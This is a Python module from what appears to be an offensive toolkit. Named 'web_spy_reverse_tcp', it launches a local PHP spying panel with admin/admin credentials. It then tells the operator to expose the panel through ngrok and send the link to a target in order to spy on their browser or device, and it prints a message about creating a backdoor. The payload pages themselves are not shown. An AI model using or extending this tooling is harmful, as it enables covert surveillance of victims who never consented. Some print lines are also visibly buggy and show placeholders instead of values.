import subprocess,json,time,hashlib
import time,socket,os
from waf.libs.color  import *
from waf.libs import variable as var

info = {
        "name"        : "web_spy_reverse_tcp",
        "title"       : "ALL Spying",
        "module"      : "payloads/web/spy/reverse_tcp android windows linux browser chrome firefox opera",
        "description" : "Use browser and Spying every things"
}

options ={
  "LPORT" : [str(var.lport[0]),'The listen port']
}


def kill_php_proc():
    with open("waf/modules/payloads/web/spy/web/Settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
        pid = data["pid"]

    try:
        for i in pid:
            print(red+'[-]'+default+'Exiting.. ')
            subprocess.getoutput(f"kill -9 {i}")
            
        else:
            pid.clear()
            data["pid"] = []
            with open("waf/modules/payloads/web/spy/web/Settings.json", "w") as jsonFile:
                json.dump(data, jsonFile)

    except:
        pass



def md5_hash():
    str2hash = time.strftime("%Y-%m-%d-%H:%M", time.gmtime())
    result = hashlib.md5(str2hash.encode())
    return result



def run_php_server(port):
    with open(f"waf/modules/payloads/web/spy/web/log/php-{md5_hash().hexdigest()}.log","w") as php_log:
        proc_info = subprocess.Popen(("php","-S",f"localhost:{port}","-t","waf/modules/payloads/web/spy/web/"),stderr=php_log,stdout=php_log).pid


    with open("waf/modules/payloads/web/spy/web/Settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
        data["pid"].append(proc_info)


    with open("waf/modules/payloads/web/spy/web/Settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)


    print(green+"[+]Web Panel Link : "+default+"http://localhost:{port}")
    print(green+"[+]UserName : "+default+"admin")
    print(green+"[+]Password : "+default+"admin")
    print(green+"\n[+] "+default+"Please Run NGROK On Port {port} AND Send Link To Target > "+yellow+f"ngrok http {port}\n"+default)



def running():
        try:
                        print ("")
                        print (blue+"[*]"+default+ "Create a backdour")
                        time.sleep(2)
                        print (blue+"[*]"+default+ "Images in waf/modules/payloads/web/spy/web/")
                        time.sleep(2)
                        print ("")
                        time.sleep(2)
                        print ("")
                        while True:
                            run_php_server(var.lport[0])
                            try:
                                input(blue+'[*]'+default+'If You Want Exit And Turn Off localhost / press enter or CTRL+C ')
                                kill_php_proc()
                                break;

    
                            except:
                                kill_php_proc()
                                break;

        except Exception as e:
                print(red+"\n[-]"+default+"Error : "+str(e))
